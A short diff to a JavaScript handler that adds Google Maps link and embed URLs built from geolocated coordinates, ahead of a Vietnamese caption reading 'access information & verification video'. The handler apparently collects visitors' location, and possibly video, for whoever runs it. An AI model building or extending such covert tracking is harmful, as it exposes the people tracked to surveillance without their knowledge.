@@ -53,7 +53,11 @@ export default async function handler(req) {
     const lon = finalLon || 0;
     
     const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
+
+    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
     const googleMapsShort = `https://maps.google.com/?q=${lat},${lon}`;
+    const googleMapsEmbed = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1000!2d${lon}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1svi!2s!4v${Date.now()}`;
+
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]
 
